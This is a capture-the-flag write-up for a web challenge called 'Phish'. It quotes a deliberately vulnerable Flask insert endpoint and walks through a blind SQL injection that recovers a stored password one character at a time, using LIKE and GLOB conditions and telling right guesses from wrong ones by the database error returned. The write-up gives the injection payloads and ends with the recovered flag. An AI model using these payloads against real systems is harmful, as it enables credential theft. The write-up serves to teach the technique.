# Phish

## Medium

## Description
Shou is so dumb that he leaks his password (flag) to a phishing website.<br/><br/>
Note: The flag contains underscore<br/><br/>
Host 1 (San Francisco): phish.sf.ctf.so<br/>
Host 2 (Los Angeles): phish.la.ctf.so<br/>
Host 3 (New York): phish.ny.ctf.so<br/>
Host 4 (Singapore): phish.sg.ctf.so<br/>

[Source Code](Assets/phish)

# Solution
## Discovery
### Source Code
We browse [main.py](Assets/phish/main.py), and find the code that is responsible for sending the data to the database<br/>
```Python
@app.route("/add", methods=["POST"])
def add():
    username = request.form["username"]
    password = request.form["password"]
    sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
    try:
        db.execute_sql(sql)
    except Exception as e:
        return f"Err: {sql} <br>" + str(e)
    return "Your password is leaked :)<br>" + \
           """<blockquote class="imgur-embed-pub" lang="en" data-id="WY6z44D"  ><a href="//imgur.com/WY6z44D">Please 
        take care of your privacy</a></blockquote><script async src="//s.imgur.com/min/embed.js" 
        charset="utf-8"></script> """
```
More importantly, focus on this section of the code:
```Python
sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
```
This is vulnerable to SQL Injection attacks<br/><br/><br/>



### SQL Injection
A quick example of using SQL Injection with the above style of code is shown below
```Python
>>> password = "abc"
    username = "(SELECT * FROM xyz)') -- "
    sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
    print(sql)
    
#   INSERT INTO `user`(password, username) VALUES ('abc', '(SELECT * FROM xyz)') -- ')
```
As we can see, it will allow us to `SELECT` columns from tables, or perform other actions<br/><br/><br/><br/><br/>



## Exploit
### Acquring characters present in password
We intend to acquire the characters present in the password by brute-forcing it through SQL queries like this, where `---HERE---` is the character we are testing
```SQL
INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password LIKE "%---HERE---%")); --', 'abc'')
```
<br/>
To explain how this works, we will first analyse the `SELECT` statement<br/>

```SQL
SELECT password FROM user WHERE username = "shou" AND password LIKE "%---HERE---%"
```
We know that there is a username `shou` with the password as the flag<br/>
Hence, we can check if a character is present in the password by adding a condition where `password LIKE "%---HERE---%"`<br/>
This works by using the `LIKE` condition, along with the multiple character wildcard, `%`<br/><br/>

If the character is present, our query will return: `UNIQUE constraint failed: user.username`<br/> 
This is because the `SELECT` statement returns `shou`, but `shou` has already been phished, and his username is present, thus we are unable to create a new row with the username `shou`<br/>

If the character is not in the password, our query will return: `NOT NULL constraint failed: user.username`<br/>
This is because SQLite expects a string to be there, yet nothing is selected since `shou`'s password does not contain the character<br/><br/>

To implement this, we send this as the POST data, where `{i}` the character we are testing:<br/>
- username : `abc,`<br/>
- password : `a',(SELECT password FROM user WHERE username = "shou" AND password LIKE "%{i}%")); --`<br/><br/><br/><br/><br/>





### Brute-forcing password
After acquring all the characters present in the password, we need to figure out how the characters are strung together<br/>
At first, we tried a very similar approach using `LIKE "---HERE---%"` as a condition in the `SELECT` statement<br/><br/>

However, `LIKE` is **case insensitive**. ie, `"a" LIKE "a"` is `True`, and `"A" LIKE "a"` is also `True`<br/>
The flag is **case sensitive**, hence we needed to find another operator<br/><br/>

Introducing `GLOB`, it is similar to `LIKE`, just that it is **case sensitive**<br/>
`GLOB` has `*` as a wildcard, and can accept REGEX queries<br/><br/>

We then use a similar injection as the first portion, where we want the following query to run, where `---HERE---` is a portion of the flag:
```SQL
INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password GLOB "---HERE---*"));--', 'abc')
```

Similar to the first portion, if the segment of the flag is correct, it returns `UNIQUE constraint failed: user.username`<br/>

If the segment is incorrect, it returns `NOT NULL constraint failed: user.username`<br/><br/><br/><br/><br/>





## Script
Hence, we created a [short Python script](Assets/solve.py) to solve for the flag<br/>
Since we are not allowed to send >100 requests per second, we added `time.sleep(0.1)` to limit our requests to at most 10 per second<br/>

> we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}
